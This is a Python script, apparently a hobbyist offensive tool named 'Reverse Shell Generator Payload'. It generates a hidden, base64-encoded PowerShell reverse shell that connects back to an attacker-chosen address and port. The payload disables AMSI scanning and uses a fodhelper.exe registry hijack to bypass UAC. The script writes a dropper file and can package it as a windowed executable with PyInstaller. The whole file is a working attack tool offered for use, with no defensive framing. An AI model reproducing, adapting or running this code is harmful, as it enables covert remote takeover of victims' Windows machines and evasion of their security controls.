
import base64
import re
import random
import string
import subprocess

def obfuscate_string(input_string):
    encoded_chars = [ord(char) for char in input_string]
    return '+'.join([f'chr({char})' for char in encoded_chars])

def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def create_powershell_payload(address, port):
    # Reverse shell payload
    payload = f"""
    $client = New-Object System.Net.Sockets.TcpClient('{address}', {port});
    $stream = $client.GetStream();
    [byte[]] $bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }}
    $client.Close();
    """

    encoded_payload = base64.b64encode(payload.encode('utf-16-le')).decode('utf-8')
    amsi_bypass = """
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
    $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true);
    """
    final_script = amsi_bypass + f"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded_payload}')))"
    final_encoded_script = base64.b64encode(final_script.encode('utf-16-le')).decode('utf-8')
    command = f"powershell.exe -nop -w hidden -enc {final_encoded_script}"
    return command, final_encoded_script


def display_banner():
    banner = """
    ==========================================
     Reverse Shell Generator Payload
     Created by: GREEN_HAT
     Version: 1.0
     tip: works better on windows
    ==========================================
    """
    print(banner)


def main():
    display_banner()
    address = input("Enter the attacker's address (IP or domain): ")
    port = input("Enter the attacker's port: ")

    ip_pattern = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")
    domain_pattern = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")
    if not (ip_pattern.match(address) or domain_pattern.match(address.split('.')[-1])):
        print("Invalid address format.")
        return

    try:
        port = int(port)
        if port < 1 or port > 65535:
            raise ValueError
    except ValueError:
        print("Invalid port number. Must be an integer between 1 and 65535.")
        return

    # Registry bypass payload to run cmd.exe with elevated privileges
    reg_bypass_payload = """
    $command = 'powershell.exe -nop -w hidden -enc <encoded_payload>'
    $regPath = "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command"
    $regValue = "DelegateExecute"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $command -Force
    Set-ItemProperty -Path $regPath -Name $regValue -Value "" -Force
    Start-Process "C:\\Windows\\System32\\fodhelper.exe"
    Start-Sleep -Seconds 5
    Remove-Item -Path $regPath -Recurse -Force
    """

    # Insert the payload into the registry bypass
    payload_command, final_encoded_script = create_powershell_payload(address, port)
    reg_bypass_payload = reg_bypass_payload.replace('<encoded_payload>', base64.b64encode(payload_command.encode('utf-16-le')).decode('utf-8'))

    print("\nGenerated PowerShell command\n")

    new_python_script = f"""
import subprocess

powershell_script = r'''
$command = 'powershell.exe -nop -w hidden -enc {final_encoded_script}'
$regPath = "HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command"
$regValue = "DelegateExecute"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name '(Default)' -Value $command -Force
Set-ItemProperty -Path $regPath -Name $regValue -Value '' -Force
Start-Process "C:\\\\Windows\\\\System32\\\\fodhelper.exe"
Start-Sleep -Seconds 5
Remove-Item -Path $regPath -Recurse -Force
'''

with open("temp_script.ps1", "w") as file:
    file.write(powershell_script)

# Execute the PowerShell script using subprocess with -ExecutionPolicy Bypass
subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "temp_script.ps1"], check=True)
"""

    # Write the new Python script to a file
    script_filename = input("Please enter with script .py name (ex:payload.py):")

    with open(script_filename, "w") as file:
        file.write(new_python_script)

    print(f"The new Python script '{script_filename}' has been created successfully.")

    # Ask the user if they want to convert the script to an executable
    convert_to_exe = input("Do you want to convert the script to an executable (.exe) automatically? (yes/no): ").strip().lower()

    if convert_to_exe == 'yes':
        # Run PyInstaller to convert the script to an executable
        print("Converting the script to an executable...")
        #make sure to give the right path where you installed your pyinstaller
        pyinstaller_path = r"C:\Users\Gabriel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe"
        result = subprocess.run([pyinstaller_path, "--onefile", "--windowed", script_filename], capture_output=True, text=True)

        if result.returncode == 0:
            print("The script has been successfully converted to an executable.")
        else:
            print("Failed to convert the script to an executable. Please ensure PyInstaller is installed and try again.")
            print("PyInstaller output:", result.stdout, result.stderr)
    else:
        print("Please convert the script to an executable manually if needed.")
        return

if __name__ == "__main__":
    main()
